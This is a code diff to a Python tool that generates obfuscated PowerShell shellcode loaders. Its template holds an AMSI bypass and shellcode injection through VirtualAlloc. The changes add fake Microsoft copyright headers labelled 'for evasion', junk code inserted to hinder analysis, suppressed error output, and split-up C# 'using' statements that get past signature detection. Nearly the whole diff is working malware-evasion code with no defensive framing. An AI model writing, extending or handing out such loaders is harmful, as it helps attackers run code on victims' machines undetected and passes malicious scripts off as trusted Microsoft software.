@@ -50,6 +50,91 @@ def encrypt_shellcode(shellcode_bytes):
     encrypted = xor_encrypt(shellcode_bytes, key)
     return encrypted, key
 
+def generate_microsoft_header():
+    """
+    Generates a realistic Microsoft PowerShell script header for evasion.
+    """
+    current_year = 2026
+    versions = ["1.0.0.0", "2.0.0.0", "2.1.0.0", "3.0.0.0", "5.1.0.0"]
+    version = random.choice(versions)
+    
+    authors = [
+        "Microsoft Corporation",
+        "Windows PowerShell Team", 
+        "Microsoft System Center Team",
+        "Microsoft Azure Team",
+        "Windows Deployment Services"
+    ]
+    author = random.choice(authors)
+    
+    script_names = [
+        "System Configuration Module",
+        "Network Diagnostics Utility",
+        "Security Policy Manager",
+        "Windows Update Assistant",
+        "System Health Monitor",
+        "Deployment Configuration Tool",
+        "Azure Resource Manager",
+        "Active Directory Helper"
+    ]
+    script_name = random.choice(script_names)
+    
+    header = f"""<#
+.SYNOPSIS
+    {script_name}
+
+.DESCRIPTION
+    This script is part of the Windows Management Framework and provides
+    essential system configuration and monitoring capabilities.
+    
+    Copyright (c) {current_year} {author}
+    All rights reserved.
+
+.PARAMETER ComputerName
+    Specifies the target computer for the operation.
+
+.PARAMETER Credential
+    Specifies a user account with appropriate permissions.
+
+.EXAMPLE
+    PS C:\\> .\\Script.ps1
+    Executes the script with default parameters.
+
+.EXAMPLE
+    PS C:\\> .\\Script.ps1 -ComputerName SERVER01
+    Executes the script against a remote computer.
+
+.NOTES
+    File Name      : {random_variable_name(8)}.ps1
+    Author         : {author}
+    Prerequisite   : PowerShell V{version}
+    Copyright      : (c) {current_year} {author}
+
+.LINK
+    https://docs.microsoft.com/powershell
+    https://docs.microsoft.com/windows-server
+#>
+
+# Module initialization
+[CmdletBinding()]
+param()
+
+# Import required assemblies
+Add-Type -AssemblyName System.Management.Automation
+Add-Type -AssemblyName System.Core
+
+# Set strict mode for better error handling
+Set-StrictMode -Version Latest
+
+# Initialize error action preference
+$ErrorActionPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+$VerbosePreference = 'SilentlyContinue'
+
+# Begin main execution block
+"""
+    return header
+
 def split_shellcode_into_chunks(shellcode_bytes, num_chunks=None):
     """
     Splits shellcode into multiple chunks with random variable names.
@@ -126,6 +211,59 @@ def create_junk_comment():
         "Validating system compliance", "Processing system notifications"
     ]
     return "# " + random.choice(words) + "."
+
+def generate_dead_code():
+    """
+    Generates realistic but meaningless PowerShell code (dead code/junk code).
+    This code never executes or affects the payload but makes analysis harder.
+    """
+    junk_patterns = [
+        # Meaningless variable assignments with random values
+        lambda: f"${random_variable_name(random.randint(8, 15))} = {random.randint(1000, 9999)}",
+        lambda: f"${random_variable_name(random.randint(8, 15))} = '{random_variable_name(random.randint(10, 20))}'",
+        lambda: f"${random_variable_name(random.randint(8, 15))} = $null",
+        lambda: f"${random_variable_name(random.randint(8, 15))} = @()",
+        
+        # Arithmetic operations that go nowhere
+        lambda: f"[Math]::Abs({random.randint(-1000, 1000)}) | Out-Null",
+        lambda: f"[Math]::Max({random.randint(1, 100)}, {random.randint(1, 100)}) | Out-Null",
+        lambda: f"[Math]::Min({random.randint(1, 100)}, {random.randint(1, 100)}) | Out-Null",
+        
+        # Conditional that always evaluates to false (unreachable code)
+        lambda: f"if (${random_variable_name(6)} -eq $null) {{ ${random_variable_name(6)} = {random.randint(1, 10)} }}",
+        lambda: f"if ({random.randint(100, 200)} -lt {random.randint(1, 50)}) {{ return }}",
+        
+        # String operations that don't affect execution
+        lambda: f"'{random_variable_name(10)}'.Length | Out-Null",
+        lambda: f"'{random_variable_name(10)}'.ToUpper() | Out-Null",
+        lambda: f"'{random_variable_name(10)}'.ToLower() | Out-Null",
+        
+        # Array operations
+        lambda: f"@({random.randint(1, 10)}, {random.randint(10, 20)}, {random.randint(20, 30)}).Count | Out-Null",
+        
+        # Environment variable checks (never used)
+        lambda: f"$env:{random.choice(['TEMP', 'TMP', 'COMPUTERNAME', 'USERNAME', 'PATH'])} | Out-Null",
+        
+        # Get-Date operations (timestamp that's never used)
+        lambda: f"(Get-Date).Ticks | Out-Null",
+        lambda: f"[DateTime]::Now.Millisecond | Out-Null",
+        
+        # Random number generation (never used)
+        lambda: f"Get-Random -Min {random.randint(1, 100)} -Max {random.randint(200, 500)} | Out-Null",
+        
+        # Type checks that go nowhere
+        lambda: f"[System.Int32] | Out-Null",
+        lambda: f"[System.String] | Out-Null",
+        
+        # Process/service checks (never acted upon)
+        lambda: f"${random_variable_name(6)} = Get-Process | Select-Object -First 1",
+        
+        # Commented out code (looks like debugging leftovers)
+        lambda: f"# ${random_variable_name(8)} = {random.randint(1, 100)}",
+        lambda: f"# Write-Host '{random_variable_name(10)}'",
+    ]
+    
+    return random.choice(junk_patterns)()
 
 def insert_backticks(text, probability=0.75):
     """Inserts backticks into a string to obfuscate it."""
@@ -443,6 +581,68 @@ def obfuscate_variable_assignments(text, level=3):
     
     return text
 
+def insert_dead_code(text, probability=0.3, min_junk=1, max_junk=3):
+    """
+    Inserts dead code (junk code) between lines to make analysis harder.
+    Avoids inserting into here-strings and specific sensitive areas.
+    """
+    lines = text.split('\n')
+    result = []
+    in_here_string = False
+    here_string_delimiter = None
+    
+    for i, line in enumerate(lines):
+        stripped = line.strip()
+        
+        # Check if we're entering a here-string (look for @" or @' anywhere in line)
+        if not in_here_string:
+            if '@"' in line:
+                in_here_string = True
+                here_string_delimiter = '"@'
+            elif "@'" in line:
+                in_here_string = True
+                here_string_delimiter = "'@"
+        # Check if we're exiting a here-string (line ends with "@ or '@)
+        elif here_string_delimiter and stripped == here_string_delimiter:
+            # Don't exit yet - add this line first, then exit after
+            result.append(line)
+            in_here_string = False
+            here_string_delimiter = None
+            continue
+        
+        # Add the original line
+        result.append(line)
+        
+        # Skip inserting dead code in here-strings or empty lines
+        if in_here_string or not line.strip():
+            continue
+        
+        # Skip lines with specific patterns (try/catch, function definitions, etc.)
+        skip_patterns = [
+            'function ', 'try {', 'catch {', '} catch', 'finally {',
+            'if (', 'foreach (', 'while (', 'for (', 
+            '}', 'return', 'break', 'continue',
+            '#>', '<#', '.SYNOPSIS', '.DESCRIPTION', '.PARAMETER', '.EXAMPLE', '.NOTES',
+            '[CmdletBinding()]', 'param(', 'Add-Type', 'Set-StrictMode',
+            '@"', "@'", '"@', "'@"  # Skip here-string delimiters
+        ]
+        
+        if any(pattern in line for pattern in skip_patterns):
+            continue
+        
+        # Insert dead code after variable assignments and certain statements
+        if random.random() < probability:
+            # Determine how many lines of junk to insert
+            num_junk_lines = random.randint(min_junk, max_junk)
+            
+            for _ in range(num_junk_lines):
+                junk = generate_dead_code()
+                # Match indentation of current line
+                indent = len(line) - len(line.lstrip())
+                result.append(' ' * indent + junk)
+    
+    return '\n'.join(result)
+
 def obfuscate_powershell(text, level=3, enable_all=True):
     """
     Main obfuscation function that applies all obfuscation techniques.
@@ -466,6 +666,13 @@ def obfuscate_powershell(text, level=3, enable_all=True):
     if enable_all or level >= 2:
         print("  [*] Inserting comments...")
         text = insert_comments(text, probability=0.2 + (level * 0.1))
+    
+    if enable_all or level >= 2:
+        print("  [*] Inserting dead code (junk code)...")
+        # Adjust probability and amount based on level
+        dead_code_prob = 0.15 + (level * 0.05)  # 0.2 at level 1, up to 0.4 at level 5
+        max_junk = min(level, 4)  # 1-4 lines of junk per insertion
+        text = insert_dead_code(text, probability=dead_code_prob, min_junk=1, max_junk=max_junk)
     
     if enable_all or level >= 2:
         print("  [*] Applying backticks...")
@@ -579,8 +786,7 @@ NOTES:
 # ------------------------------------------------------------------
 # POWERSHELL TEMPLATE (AMSI Bypass + Injection)
 # ------------------------------------------------------------------
-PS_TEMPLATE = """
-$g = "Amsi"
+PS_TEMPLATE = """$g = "Amsi"
 $c = "Utils"
 $ref = $g + $c
 try {{
@@ -613,9 +819,11 @@ if ($buf.Length -eq 0) {{
     exit
 }}
 
-$Kernel32 = @"
-using System;
-using System.Runtime.InteropServices;
+# Build using statements dynamically
+${using_var1} = "usi" + "ng Sys" + "tem;"
+${using_var2} = "usi" + "ng Sys" + "tem.Run" + "time.Int" + "eropSer" + "vices;"
+
+$Kernel32 = ${using_var1} + "`n" + ${using_var2} + "`n" + @"
 public class {csharp_class_name} {{
     private const string {dll_part1} = "ker";
     private const string {dll_part2} = "nel";
@@ -774,6 +982,10 @@ if ($buf.Length -ge 16) {{
     # but we can obfuscate it with string concatenation
     entrypoint_obfuscated = "Virt" + "ualAl" + "loc"
     
+    # Generate random variable names for C# using statements
+    using_var1 = random_variable_name(random.randint(15, 25))
+    using_var2 = random_variable_name(random.randint(15, 25))
+    
     # Inject into template
     final_script = PS_TEMPLATE.format(
         encrypted_shellcode_chunks=encrypted_shellcode_chunks, 
@@ -786,7 +998,9 @@ if ($buf.Length -ge 16) {{
         dll_part3=dll_part3,
         dll_part4=dll_part4,
         method_name=method_name,
-        entrypoint_obfuscated=entrypoint_obfuscated
+        entrypoint_obfuscated=entrypoint_obfuscated,
+        using_var1=using_var1,
+        using_var2=using_var2
     )
     
     # Apply obfuscation if enabled
@@ -795,6 +1009,11 @@ if ($buf.Length -ge 16) {{
         final_script = obfuscate_powershell(final_script, level=obfuscation_level)
     else:
         print("[*] Obfuscation disabled")
+    
+    # Generate Microsoft-style header for evasion (AFTER obfuscation)
+    print("[*] Adding Microsoft PowerShell header...")
+    microsoft_header = generate_microsoft_header()
+    final_script = microsoft_header + "\n" + final_script
 
     # Write final loader
     try:
